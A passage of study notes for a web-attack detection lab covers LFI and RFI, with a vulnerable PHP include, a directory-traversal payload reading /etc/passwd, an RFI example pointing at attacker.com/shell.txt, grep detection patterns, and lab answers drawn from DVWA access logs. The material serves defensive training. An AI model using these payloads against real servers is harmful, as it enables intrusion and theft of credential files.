192.168.31.174 - - [01/Mar/2022:11:42:37 -0800] "GET /dvwa/get_user_info/?id=5
192.168.31.174 - - [01/Mar/2022:11:42:45 -0800] "GET /dvwa/get_user_info/?id=6
192.168.31.174 - - [01/Mar/2022:11:42:46 -0800] "GET /dvwa/get_user_info/?id=7
192.168.31.174 - - [01/Mar/2022:11:42:51 -0800] "GET /dvwa/get_user_info/?id=8
192.168.31.174 - - [01/Mar/2022:11:42:54 -0800] "GET /dvwa/get_user_info/?id=9
192.168.31.174 - - [01/Mar/2022:11:42:59 -0800] "GET /dvwa/get_user_info/?id=10
root@ip-172-31-6-145:~/Desktop/QuestionFiles# 
```

**Ans: Submit**

---

Q2. What is the date when the attack started?

- **Answer Format:** 01/Mar/2022:12:00:00

**Ans: Submit**

---

Q3. Was the attack successful?

- **Answer Format:** Y/N

Searched based on the attacker ip

<img width="1366" height="824" alt="image" src="https://github.com/user-attachments/assets/78b5c9fd-691c-429d-be66-e82ff20db1dd" />

Based on the status response for some requests and the difference between the response size. 

**Ans: Yes**

---

Q4. Was the attack carried out by an automated tool?

- **Answer Format:** Y/N

Based on the user-agent and the request time fram, i would say no

# Detecting RFI & LFI Attacks

## **What is Local File Inclusion (LFI)?**

LFI occurs when a web application **includes a file on the local server** using unsanitized user input.

Attackers can:

- Read sensitive server files (e.g., `/etc/passwd`, config files)
- Access credentials stored on the server
- Potentially escalate to remote code execution (via log poisoning, wrappers, etc.)

## **What is Remote File Inclusion (RFI)?**

RFI happens when a web application **includes a file from a remote server** without sanitizing user input.

Attackers host malicious code on their own server and force the victim web application to include and execute it.

This often leads to:

- Remote code execution
- Server takeover
- Malware delivery

## **How LFI & RFI Work**

These vulnerabilities occur when user-controlled input is used directly in file inclusion functions.

Example vulnerable design:

```php
include("website/" . $_GET['language'] . "/home.php");
```

### Normal Usage:

`language=en`

Loads:

```
website/en/home.php
```

### Malicious Input (LFI Payload):

```
language=/../../../../../../etc/passwd%00
```

Application attempts to load:

```
website/../../../../../../etc/passwd%00/home.php
```

- `../` climbs directories until reaching root.
- `/etc/passwd` is included and displayed.
- `%00` is a null-byte, used to **terminate the string early**, bypassing the appended `/home.php`.

This allows attackers to include **any local file**.

---

## **How Attackers Use LFI & RFI**

Both vulnerabilities allow serious attacks, such as:

### **LFI**

- Reading sensitive files (passwords, config, SSH keys)
- Log poisoning → remote code execution
- Reading application source code
- DOS (through huge file inclusion)

### **RFI**

- Executing remote malicious code
- Gaining full remote control
- Hosting malware on victim servers
- Defacement or complete compromise

---

## **How to Prevent LFI & RFI**

1. **Sanitize all user input**
    
    Reject `../`, null bytes, absolute paths.
    
2. **Use whitelists**
    
    Only allow specific allowed values like: `['en', 'fr', 'tr']`.
    
3. **Implement both client-side AND server-side validation**
    
    Client-side can be bypassed.
    
4. **Disable risky PHP functions** (if applicable)
    - `allow_url_include = Off`
    - `allow_url_fopen = Off`

## **Detecting LFI & RFI Attacks**

To effectively detect these attacks:

### **1. Examine all user-controlled fields**

Parameters like `file=`, `page=`, `lang=`, `template=` are the most common.

### **2. Look for special characters**

LFI often includes:

- `../`
- `/`
- `\`
- `..%2f`
- URL-encoded versions (`%2e%2e%2f`)

### **3. Know commonly targeted local files**

Attackers frequently attempt to read files like:

- `/etc/passwd`
- `/etc/shadow`
- `/var/log/auth.log`
- `/proc/self/environ`
- `/windows/win.ini`

### **4. Look for HTTP/HTTPS References**

RFI payloads often contain:

- `http://`
- `https://`
- Full URLs pointing to attacker-controlled servers

Example:

```
?page=http://attacker.com/shell.txt
```

Attackers often host small HTTP servers on their machines to deliver malicious payloads.

## **Key Takeaways**

- **LFI includes local files; RFI includes remote files.**
- Both arise when user input is used directly in file inclusion.
- Detection involves spotting **directory traversal**, **file names**, or **URLs**.
- Attackers can escalate LFI into remote code execution.
- RFI directly leads to execution of attacker-controlled code.

## Grep Command Filter

```bash
# All-in-one
grep -Ei '(\.\./|/etc/passwd|/proc/self|php://|input|data://|%00|http://|https://)' 

# More Strict LFI Detection
grep -Ei '(\.\./|\.\.%2f|/etc/passwd|/proc/self|php://|filter|%00)' 

# More Strict RFI Detection
grep -Ei '(http://|https://|ftp://|file=|remote=)' 

# Full Pattern Set
grep -Ei '(\.\./|%2e%2e%2f|%2e%2e/|/etc/passwd|/proc/self|php://(input|filter)|data://|expect://|zip://|phar://|%00|http://|https://|ftp://)' 

```

## Q&A

**Note:** Use the "`/root/Desktop/QuestionFiles/File_Inclusion_Web_Attacks.rar`" file for solving the questions below.

**Q1. What is the attacker's IP address?**

- **File Password:** access

```bash
root@ip-172-31-6-145:~/Desktop/QuestionFiles# grep -Ei '(\.\./|\.\.%2f|/etc/passwd|/proc/self|php://|filter|%00)' lfi\ -\ apache\ access\ logs.txt 
192.168.31.174 - - [01/Mar/2022:11:58:35 -0800] "GET /dvwa/vulnerabilities/fi/?page=../../ HTTP/1.1" 200 50 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.31.174 - - [01/Mar/2022:11:58:48 -0800] "GET /dvwa/vulnerabilities/fi/?page=../../index.php HTTP/1.1" 200 50 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.31.174 - - [01/Mar/2022:11:58:54 -0800] "GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1" 200 50 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.31.174 - - [01/Mar/2022:11:59:08 -0800] "GET /dvwa/vulnerabilities/fi/?page=../../text.php HTTP/1.1" 200 50 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
root@ip-172-31-6-145:~/Desktop/QuestionFiles# 

```

**Ans:** *192.168.31.174* 

---

**Q2. What is the start date of the attack?**

- **Answer Format:** 01/Mar/2022:12:00:00

**Ans:** *01/Mar/2022:11:58:35*

---

**Q3. Was the attack successful?**

- **Answer Format:** Y/N

based on the response size (50), I would say no
